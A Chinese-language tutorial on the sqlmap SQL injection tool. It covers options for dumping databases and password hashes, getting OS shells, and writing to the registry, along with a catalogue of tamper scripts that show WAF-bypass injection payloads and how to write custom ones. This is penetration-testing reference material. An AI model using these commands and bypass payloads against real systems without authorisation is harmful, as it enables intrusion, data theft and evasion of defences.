# SQLMAP

> * [SQLMAP深入分析-使用篇（基础使用、进阶命令、tamper脚本）](https://blog.csdn.net/q20010619/article/details/122222636?ops\_request\_misc=\&request\_id=\&biz\_id=102\&utm\_term=sqlmap%20%E8%84%9A%E6%9C%AC%E4%BF%A1%E6%81%AF\&utm\_medium=distribute.pc\_search\_result.none-task-blog-2\~all\~sobaiduweb\~default-0-122222636.142^v68^pc\_rank\_34\_queryrelevant25,201^v4^add\_ask,213^v2^t3\_control1\&spm=1018.2226.3001.4187)
> * [sqlmap用户手册详解【实用版】](https://www.vuln.cn/2035)
> * [Sqlmap使用教程【个人笔记精华整理】](https://www.vuln.cn/1992)

## SQLMAP 简介

sqlmap支持五种不同的注入模式：

* 基于布尔的盲注，即可以根据返回页面判断条件真假的注入。
* 基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。
* 基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。
* 联合查询注入，可以使用union的情况下的注入。
* 堆查询注入，可以同时执行多条语句的执行时的注入。

### SQLMAP支持的数据库

MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB

## 参数

### 1. 指定目标

```shell
-d DIRECT 直接连接到数据库。
-u URL, –url=URL 目标URL。
-l LIST 从Burp或WebScarab代理的日志中解析目标。
-r REQUESTFILE 从一个文件中载入HTTP请求。
-g GOOGLEDORK 处理Google dork的结果作为目标URL。
-c CONFIGFILE 从INI配置文件中加载选项。
```

### 2. 请求

```shell
--data			 # 将数据以 POST 方式提交
--method		# 强制使用提供的 HTTP 方法（例如：PUT）
–-param-del      # 当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数
–-cookie 			# 设定 Cookie 
--host				# 设定 host
--ignore-code		# 忽略（有问题的）HTTP 错误码
--safe-freq=SAFE	# 每访问两次给定的合法 URL 才发送一次测试请求

--drop-set-cookie	#忽略 HTTP 响应中的 Set-Cookie 参数
–-referer		# sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入
–-headers		# 设置 HTTP 头,必须以换行符分隔
–-auth-cert		# 当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file;
				# key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件
–-delay			# HTTP 请求延迟，可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的
–-timeout		# 设定超时时间，可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒
–-retries		# 设定重试超时，当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次
–-randomize		# 设定随机改变的参数值，可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样
–-threads		# 设置并发量
–-keep-alive		# 使用持久的HTTP（S）连接
-o 				# 开启所有优化开关
–-scope			# 利用正则过滤目标网址				
--eval			# 每次请求时候执行自定义的python代码
--csrf-token 和 --csrf-url			# 绕过反 CSRF 防护
–-null-connection 					# 从没有实际的HTTP响应体中检索页面长度
–-skip-urlencode					  	# 关掉URL参数值编码
–-user-agent,–-random-agent  		  	# 设置 User-Agent
–-auth-type,–-auth-cred	   		  	# 这些参数可以用来登陆HTTP的认证保护支持三种方式： Basic/Digest/NTLM
–-proxy,–-proxy-cred,–-ignore-proxy  	# 使用–proxy代理是格式为：http://url:port   
								  	# 当HTTP(S)代理需要认证是可以使用–proxy-cred参数：username:password
								  	# –ignore-proxy拒绝使用本地局域网的HTTP(S)代理
–-safe-url,–-safe-freq			  	# 避免过多的错误请求被屏蔽
								  	# 有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。
								  	# --safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下
								  	# --safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接

```

> COOKIE :
>
> 参数：–cookie,–load-cookies,–drop-set-cookie 这个参数在以下两个方面很有用：
>
> 1. web应用需要登陆的时候。
> 2. 你想要在这些头参数中测试SQL注入时。
>
> 可以通过抓包把cookie获取到，复制出来，然后加到–cookie参数里。 在HTTP请求中，遇到Set-Cookie的话，sqlmap会自动获取并且在以后的请求中加入，并且会尝试SQL注入。 如果你不想接受Set-Cookie可以使用–drop-set-cookie参数来拒接。 当你使用–cookie参数时，当返回一个Set-Cookie头的时候，sqlmap会询问你用哪个cookie来继续接下来的请求。当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数。

### 3. 注入

```shell
-p				# 设置测试参数
--skip 			# 设置不测试的参数
–-dbms			# 指定数据库
-os				# 指定数据库服务器状态
–-invalid-bignum # 指定无效的大数字
–-invalid-logical	# 指定无效的逻辑，可以指定id=13把原来的id=-13的报错改成id=13 AND 18=19
–-prefix			# 在注入的 payload 前面加一些字符
–-suffix			# 在注入的 payload 后面加一些字符
–-tamper			# 修改注入的数据，过 WAF 等设备
```

### 4. 探测

```shell
–-level=LEVEL 	# 执行测试的等级（1-5，默认为1）
–-risk=RISK 		# 执行测试的风险（0-3，默认为1）
–-string=STRING  # 查询时有效时在页面匹配字符串
–-regexp=REGEXP  # 查询时有效时在页面匹配正则表达式
–-text-only 		# 仅基于在文本内容比较网页
```

### 5. 注入技术

```shell
–-technique=TECH 	# SQL注入技术测试（默认BEUST）
–-time-sec=TIMESEC 	# DBMS响应的延迟时间（默认为5秒）
–-union-cols=UCOLS 	# 定列范围用于测试UNION查询注入
–-union-char=UCHAR 	# 用于暴力猜解列数的字符
–-second-order=URL		# 二阶SQL注入
```

### 6. 列数据

```shell
--b,–-banner		# 标志
--current-user 	# 用户
–-current-db		# 当前数据库
–-is-dba			# 当前用户是否为管理用
–-users			# 列出数据库管理用户
–-passwords		# 列出并破解数据库用户的hash
–-privileges		# 列出数据库管理员权限
–-roles			# 列出数据库管理员角色， 仅适用于当前数据库是Oracle的时候
–-dbs			# 列出数据库系统的数据库
–-tables			# 列举数据库表
–-columns		# 列举数据库表中的字段
–-schema			# 列举数据库系统的架构
–-count			# 获取表中数据个数
–-dump			# 获取整个表的数据
–-dump-all		# 获取所有数据库表的内容
-D DBname		# 要进行枚举的指定数据库名
-T TBLname		# 要进行枚举的指定数据库表
-C COL 			# 要进行枚举的数据库列
–-start=LIMITSTART 	# 第一个查询输出进入检索
–-stop=LIMITSTOP 	# 最后查询的输出进入检索
–-first=FIRSTCHAR 	# 第一个查询输出字的字符检索
–-last=LASTCHAR 		# 最后查询的输出字字符检索
–-exclude-sysdbs 	# 枚举表时排除系统数据库
–-search				# 搜索字段，表，数据库
–-sql-query			# 要执行的SQL语句
–-sql-shell 			# 提示交互式SQL的shell
```

### 7. 爆破

```shell
–-common-tables		# 暴力破解表名
–-common-columns		# 暴力破解列名
–-udf-inject			# 用户自定义函数注入
–-shared-lib=SHLIB	# 共享库的本地路径
```

### 8. 文件&命令操作

```shell
–-file-read=RFILE 		# 从数据库服务器中读取文件
–-file-write=WFILE		# 把文件上传到数据库服务器中
–-file-dest=DFILE		# 后端的数据库管理系统写入文件的绝对路径
–-os-cmd=OSCMD 			# 执行操作系统命令
–-os-shell 				# 交互式的操作系统的shell
–-os-pwn 				# 获取一个OOB shell，meterpreter或VNC
–-os-smbrelay 			# 一键获取一个OOB shell，meterpreter或VNC
–-os-bof 				# 存储过程缓冲区溢出利用
–-priv-esc 				# 数据库进程用户权限提升
–-msf-path=MSFPATH 		# Metasploit Framework本地的安装路径
–-tmp-path=TMPPATH 		# 远程临时文件目录的绝对路径
```

### 9. 对 Windows 注册表操作

当数据库为MySQL，PostgreSQL或Microsoft SQL Server，并且当前web应用支持**堆查询**。 当然，当前连接数据库的用户也需要有权限操作注册表。

```shell
–-reg-read			# 读取注册表值
–-reg-add			# 写入注册表值
–-reg-del			# 删除注册表值
–-reg-key=REGKEY 	# Windows注册表键
–-reg-value=REGVAL 	# Windows注册表项值
–-reg-data=REGDATA 	# Windows注册表键值数据
–-reg-type=REGTYPE 	# Windows注册表项值类型


python sqlmap.py -u http://192.168.136.129/sqlmap/pgsql/get_int.aspx?id=1 --reg-add --reg-key="HKEY_LOCAL_MACHINE\SOFTWARE\sqlmap" --reg-value=Test --reg-type=REG_SZ --reg-data=1
```

### 10. 常规参数

```shell
-s		 		# 从sqlite中读取session
-t				# 保存HTTP(S)日志
–-batch			# 非交互模式
–-charset		# 强制使用字符编码
–-crawl			# 爬行网站URL,sqlmap可以收集潜在的可能存在漏洞的连接，后面跟的参数是爬行的深度
–-csv-del		# 规定输出到CSV中的分隔符
–-dbms-cred		# DBMS身份验证
–-dump-format	# 定义dump数据的格式, CSV，HTML，SQLITE
–-eta			# 预估完成时间
–-flush-session	# 刷新session文件
–-forms			# 自动获取form表单测试
–-fresh-queries	# 忽略在会话文件中存储的查询结果
–-hex			# 使用DBMS的hex函数，有时候字符编码的问题，可能导致数据丢失，可以使用hex函数来避免
–-output-dir		# 自定义输出的路径
–-parse-errors	# 从响应中获取DBMS的错误信息
```

### 11. 其他参数

```shell
-z			# 使用参数缩写
–-alert		# 成功SQL注入时警告 
–-answers	# 设定会发的答案
–-beep		# 发现SQL注入时发出蜂鸣声
-v			# 查看注入检测详情,见下注解
–-check-waf	# 启发式检测WAF/IPS/IDS保护
–-cleanup	# 清理sqlmap的UDF(s)和表
–-desable-coloring	# 禁用彩色输出
–-gpage		# 使用指定的Google结果页面，默认sqlmap使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试
--hpp		# HTTP参数污染可能会绕过WAF/IPS/IDS保护机制，这个对ASP/IIS与ASP.NET/IIS平台很有效
–-identify-waf	# 测试WAF/IPS/IDS保护
–-mobile		# 有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆
–-purge-output	# 安全的删除output目录的文件
–-smart		# 启发式判断注入
–-wizard		# 初级用户向导参数
–-update 	# 更新SqlMap
```

> 1. \-v 参数：
> 2. 只显示python错误以及严重的信息
> 3. 同时显示基本信息和警告信息。（默认）
> 4. 同时显示debug信息
> 5. 同时显示注入的payload
> 6. 同时显示HTTP请求
> 7. 同时显示HTTP响应头
> 8. 同时显示HTTP响应页面

## Tamper 脚本

> tamper 脚本可以用来对 sqlmap 的 sql 查询语句进行一次处理，让其绕过过滤，tamper 脚本在 sqlmap 安装目录的 tamper 目录下

```shell
use age：sqlmap.py --tamper="模块名.py"
```

### 1. tamper 适用的数据库类型 & 版本

| TAMPER                    | MySQL         | MSSQL      | Oracle | PostgreSQL  |
| ------------------------- | ------------- | ---------- | ------ | ----------- |
| apostrophemask            | \*            | \*         | \*     | \*          |
| apostrophenullencode      | -             | -          | -      | -           |
| appendnullbyte            | \*            | \*         | \*     | \*          |
| base64encode              | 4,5,5.5       | 2005       | 10g    | -           |
| between                   | 5.1           | -          | -      | -           |
| bluecoat                  | \*            | \*         | \*     | \*          |
| apostrophemask            | 9.0.3         | 20002005   | -      | 9.3         |
| charunicodeencode         | 4,5.0 and 5.5 | 2005       | 10g    | 8.3,8.4,9.0 |
| charencode                | \*            | -          | -      | -           |
| commalessmid              | \*            | -          | -      | -           |
| concat2concatws           | \*            | \*         | \*     | \*          |
| equaltolike               | \*            | \*         | \*     | \*          |
| greatest                  | < 5.1         | -          | -      | -           |
| halfversionedmorekeywords | 5.0 and 5.5   | -          | -      | -           |
| ifnull2ifisnull           | \*            | \*         | \*     | \*          |
| informationschemacomment  | 4,5.0,5.5     | 2005       | 10g    | 8.3,8.4,9.0 |
| lowercase                 | 5             | -          | -      | -           |
| modsecurityversioned      | 5             | -          | -      | -           |
| modsecurityzeroversioned  | \*            | \*         | \*     | \*          |
| multiplespaces            | \*            | \*         | \*     | \*          |
| nonrecursivereplacement   | \*            | \*         | \*     | \*          |
| overlongutf8              | 5.1.56,5.5.11 | 2000, 2005 | N/A    | 9           |
| percentage                | 4, 5.0,5.5    | 2005       | 10g    | 8.3,8.4,9.0 |
| randomcase                | \*            | \*         | \*     | \*          |
| randomcomments            | \*            | \*         | \*     | \*          |
| securesphere              | 4,5.0,5.5     | 2005       | 10g    | 8.3,8.4,9.0 |
| space2comment             | -             | -          | -      | -           |
| space2dash                | 4.0,5.0       | -          | -      | -           |
| space2hash                | >= 5.1.13     | -          | -      | -           |
| space2morehash            | -             | 2000, 2005 | -      | -           |
| space2mssqlblank          | \*            | \*         | -      | -           |
| space2mssqlhash           | \*            | \*         | \*     | \*          |
| space2plus                | 4,5.0,5.5     | 2005       | 10g    | 8.3,8.4,9.0 |
| space2randomblank         | -             | \*         | -      | -           |
| sp\_password              | \*            | \*         | \*     | \*          |
| symboliclogical           | \*            | \*         | \*     | \*          |
| unionalltounion           | \*            | \*         | \*     | \*          |
| unmagicquotes             | 4, 5.0,5.5    | 2005       | 10g    | 8.3,8.4,9.0 |
| uppercase                 | \*            | \*         | \*     | \*          |
| varnish                   | \*            | -          | -      | -           |
| versionedkeywords         | >=5.1.13      | -          | -      | -           |
| versionedmorekeywords     | \*            | \*         | \*     | \*          |
| xforwardedfor             | \*            | \*         | \*     | \*          |

### 2. 自带tamper介绍

```shell
apostrophemask.py
功能：对引号进行 utf-8 格式编码 (% EF% BC%87)
平台：All
举例：1 AND ‘1’=’1 ==> 1 AND % EF% BC%871% EF% BC%87=% EF% BC%871

apostrophenullencode.py
功能：用非法的双 unicode 字符 (%00%27) 替换引号字符
平台：All
举例：1 AND ‘1’=’1 ==> 1 AND %00%271%00%27=%00%271

appendnullbyte.py
功能：在有效载荷结束位置加载零字节字符编码
平台：Microsoft Access
举例：1 AND 1=1 ==> 1 AND 1=1%00

base64encode.py
功能：用 base64 格式进行编码
平台：All
举例：1’ AND SLEEP (5)# ==> MScgQU5EIFNMRUVQKDUpIw==

between.py
功能：用 between 替换大于号（>）
平台：Mssql2005、MySQL 4/5.0/5.5、Oracle 10g、PostgreSQL 8.3/8.4/9.0
举例：
1 AND A > B –  ==> 1 AND A NOT BETWEEN 0 AND B  –
1 AND A = B –  ==> 1 AND A BETWEEN B AND B –

bluecoat.py
功能：对 SQL 语句替换空格字符为 (%09)，并替换”=”—>”LIKE”
平台：MySQL 5.1, SGOS
举例：SELECT username FROM users WHERE id = 1 ==> SELECT%09username FROM%09users WHERE%09id LIKE 1

apostrophemask.py
功能：用 utf-8 格式编码引号 (如：% EF% BC%87)
平台：All
举例：1 AND ‘1’=’1 ==> 1 AND % EF% BC%871% EF% BC%87=% EF% BC%871

charunicodeencode.py
功能：对字符串进行 Unicode 格式转义编码
平台：Mssql 2000,2005、MySQL 5.1.56、PostgreSQL 9.0.3 ASP/ASP.NET
举例：SELECT FIELD%20FROM TABLE ==> % u0053% u0045% u004C% u0045% u0043% u0054% u0020% u0046% u0049% u0045% u004C% u0044% u0020% u0046% u0052% u004F% u004D% u0020% u0054% u0041% u0042% u004C% u0045

charencode.py
功能：采用 url 格式编码 1 次
平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
举例：SELECT FIELD FROM%20TABLE ==> %53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45

chardoubleencode.py
功能：采用 url 格式编码 2 次
平台：All
举例：SELECT FIELD FROM%20TABLE ==> %2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545

commalessmid.py
功能：将 payload 中的逗号用 from 和 for 代替，用于过滤了逗号并且是 3 个参数的情况
平台：MySQL 5.0, 5.5
举例：MID (VERSION (), 1, 1) ==> MID (VERSION () FROM 1 FOR 1)

concat2concatws.py
功能：CONCAT () ==> CONCAT_WS ()，用于过滤了 CONCAT () 函数的情况
平台： MySQL 5.0
举例：CONCAT (1,2) ==> CONCAT_WS (MID (CHAR (0),0,0),1,2)

equaltolike.py
功能：= ==> LIKE，用于过滤了等号”=” 的情况
平台：Mssql 2005、MySQL 4, 5.0 and 5.5
举例：SELECT * FROM users WHERE id=1 ==> SELECT * FROM users WHERE id LIKE 1

greatest.py
功能：> ==> GREATEST
平台：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
举例：1 AND A > B ==> 1 AND GREATEST (A, B+1)=A
a 和 b+1 比较，取两者中的最大值为 a；则 a >= b+1，亦即 a > b

halfversionedmorekeywords.py
功能：空格 ==> / !0 （在关键字前添加注释）
平台：MySQL 4.0.18, 5.0.22（Mysql < 5.1）
举例：union ==> /!0union

ifnull2ifisnull.py
功能：IFNULL (A, B) ==> IF (ISNULL (A), B, A)
平台：MySQL 5.0 and 5.5
举例：IFNULL (1, 2) ==> IF (ISNULL (1),2,1)

informationschemacomment.py
功能：
在 information_schema 后面加上 // ，用于绕过对 information_schema 的情况
retVal = re.sub(r”(?i)(information_schema).”, “g<1>/ /.”, payload)
平台：All
举例：select table_name from information_schema.tables ==> select table_name from information_schema/**/.tables

lowercase.py
功能：将 payload 里的大写转为小写
平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
举例：SELECT table_name FROM INFORMATION_SCHEMA.TABLES ==> select table_name from information_schema.tables

modsecurityversioned.py
功能：用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf
平台：MySQL 5.0
举例：1 AND 2>1–  ==> 1 /!30874AND 2>1/–

modsecurityzeroversioned.py
功能：用注释来包围完整的查询语句，用于绕过 waf ，和上面类似
平台：Mysql
举例：1 and 2>1–+ ==> 1 /!00000and 2>1/–+

multiplespaces.py
功能：围绕 SQL 关键字添加多个空格
平台：All
举例：1 UNION SELECT foobar ==> 1   UNION   SELECT   foobar

nonrecursivereplacement.py
功能：关键字双写，可用于关键字过滤
平台：All
举例：1 UNION SELECT 2–  ==> 1 UNIONUNION SELESELECTCT 2–

overlongutf8.py
功能： 转换给定的 payload 当中的所有字符
平台：All
举例：SELECT FIELD FROM TABLE WHERE 2>1 ==> SELECT% C0% AAFIELD% C0% AAFROM% C0% AATABLE% C0% AAWHERE% C0% AA2% C0% BE1

percentage.py
功能：用百分号来绕过关键字过滤，在关键字的每个字母前面都加一个 (%)
平台：Mssql 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0
举例：SELECT FIELD FROM TABLE ==> % S% E% L% E% C% T % F% I% E% L% D % F% R% O% M % T% A% B% L% E

randomcase.py
功能：将 payload 随机大小写
平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
举例：INSERT ==> InseRt

randomcomments.py
功能：在 payload 的关键字中间随机插入注释符 /**/ ，可用于绕过关键字过滤
平台：Mysql
举例：INSERT ==> I / ** / N / ** / SERT

securesphere.py
功能：在 payload 后追加特殊构造的字符串
平台：All
举例：1 AND 1=1 ==> 1 AND 1=1 and ‘0having’=’0having’

space2comment.py
功能：用注释符 // 代替空格，用于空格的绕过
平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
举例：SELECT id FROM users ==> SELECT//id//FROM//users

space2dash.py
功能：用 [注释符 (–)+ 一个随机字符串 + 一个换行符] 替换控制符
平台：MSSQL、 SQLite
举例：union select 1,2–+ ==> union–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+

space2hash.py
功能：用 [注释符 (#)+ 一个随机字符串 + 一个换行符] 替换控制符
平台：Mysql
举例：union select 1,2–+ ==> union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2–+

space2morehash.py
功能：用多个 [注释符 (#)+ 一个随机字符串 + 一个换行符] 替换控制符
平台：MySQL >= 5.1.13
举例：union select 1,2–+ ==> union %23 HSHjsJh %0A select %23 HhjHSJ %0A%23 HJHJhj %0A 1,2–+

space2mssqlblank.py
功能：用随机的空白符替换 payload 中的空格
blanks = (‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)
平台：Mssql 2000,2005
举例：SELECT id FROM users ==> SELECT%0Eid%0DFROM%07users

space2mssqlhash.py
功能：用 [字符# + 一个换行符] 替换 payload 中的空格
平台：MSSQL、MySQL
举例：union select 1,2–+ ==> union%23%0Aselect%23%0A1,2–+

space2plus.py
功能：用加号 (+) 替换空格
平台：All
举例：SELECT id FROM users ==> SELECT+id+FROM+users

space2randomblank.py
功能：用随机的空白符替换 payload 中的空格
平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
举例：SELECT id FROM users ==> SELECT%0Did%0DFROM%0Ausers

sp_password.py
功能：在 payload 语句后添加 sp_password ，用于迷惑数据库日志（Space ==> sp_password）
平台：Mssql
举例：1 AND 9227=9227–  ==> 1 AND 9227=9227 – sp_password

symboliclogical.py
功能：用 && 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况
平台：All
举例：
1 and 1=1 ==> 1 %26%26 1=1
1 or 1=1 ==> 1 %7c%7c 1=1

unionalltounion.py
功能：用 union select 替换 union all select
平台：All
举例：union all select 1,2–+ ==> union select 1,2–+

unmagicquotes.py
功能：用宽字符绕过 GPC addslashes
平台：All
举例：1’ and 1=1 ==> 1% df%27 and 1=1–

uppercase.py
功能：将 payload 中的小写字母转为大写格式
平台：Mssql 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0
举例：insert ==> INSERT

varnish.py
功能：添加一个 HTTP 头 “X-originating-IP” 来绕过 WAF
平台：headers = kwargs.get (“headers”, {}) headers [“X-originating-IP”] = “127.0.0.1”return payload
举例：All

versionedkeywords.py
功能：对非函数的关键字进行注释
平台：MySQL 4.0.18, 5.1.56, 5.5.11
举例：1 union select user () ==> 1/!UNION//!SELECT/user ()

versionedmorekeywords.py
功能：对每个关键字进行注释处理
平台：MySQL 5.1.56, 5.5.11
举例：1 union select user () ==> 1/!UNION//!SELECT/user ()

xforwardedfor.py
功能：添加一个伪造的 HTTP 头 “X-Forwarded-For” 来绕过 WAF
平台：All
举例：headers = kwargs.get (“headers”, {}) headers [“X-Forwarded-For”] = randomIP () return payload
```

### 3. 编写tamper

先来看一个简单的 tamper：apostrophemask.py

```shell
# Needed imports
from lib.core.enums import PRIORITY

# Define which is the order of application of tamper scripts against
# the payload
__priority__ = PRIORITY.NORMAL

def tamper(payload, **kwargs):
    '''
    Description of your tamper script
    '''

    retVal = payload.replace('\'', "%EF%BC%87") if payload else payload

    # your code to tamper the original payload

    # return the tampered payload
    return retVal
```

这个 tamper 非常的简单，写的话参考这个就可以了，先来分析这里边有什么元素

* import部分
* `__priority__` 属性
* dependencies函数
* tamper函数以及用户自定义的函数

#### 1. import 部分

可以导入sqlmap的内部库，sqlmap 为我们提供了很多封装好的函数和数据类型，比如上面的的`PRIORITY`就来源于`sqlmap/lib/core/enums.py`

#### 2. priority

定义当前 tamper 的优先级，用于有多个tamper脚本的情况，有以下参数

```shell
class PRIORITY:
    LOWEST = -100
    LOWER = -50
    LOW = -10
    NORMAL = 0
    HIGH = 10
    HIGHER = 50
    HIGHEST = 100
```

#### 3. dependencies

函数声明该脚本适用/不适用的范围，可以为空，比如以下代码

```shell
# sqlmap/tamper/echarunicodeencode.py
from lib.core.common import singleTimeWarnMessage
 
def dependencies():
    singleTimeWarnMessage("tamper script '%s' is only meant to be run against ASP or ASP.NET web applications" % os.path.basename(__file__).split(".")[0])
 
# singleTimeWarnMessage() 于在控制台中打印出警告信息
```

数据库有以下名称，在`lib\core\enums.py`可以看到全部

```shell
class DBMS:
    ACCESS = "Microsoft Access"
    DB2 = "IBM DB2"
    FIREBIRD = "Firebird"
    MAXDB = "SAP MaxDB"
    MSSQL = "Microsoft SQL Server"
    MYSQL = "MySQL"
    ORACLE = "Oracle"
    PGSQL = "PostgreSQL"
    SQLITE = "SQLite"
    SYBASE = "Sybase"
    HSQLDB = "HSQLDB"
    ......
```

#### 4. tamper函数

主要功能实现的函数，其中 payload 参数就是原始的 sqlmap的原始注入payload，我们要实现绕过，一般就是针对这个 payload 的修改

比如双写绕过的 payload

```shell
def tamper(payload, **kwargs):
    payload = payload.lower()
    payload = payload.replace('select','seleselectct')
    payload = payload.replace('union','ununionion')
    return payload
```

第二个参数：`**kwargs`中包含了 http 头的数据，可以从`kwargs`中取出`headers`数组在进行更改

比如将 http 头中的 xff 头变为随机 ip

```shell
def tamper(payload, **kwargs):
	headers = kwargs.get("headers", {})
	headers["X-Forwarded-For"] = randomIP()
	return payload
```
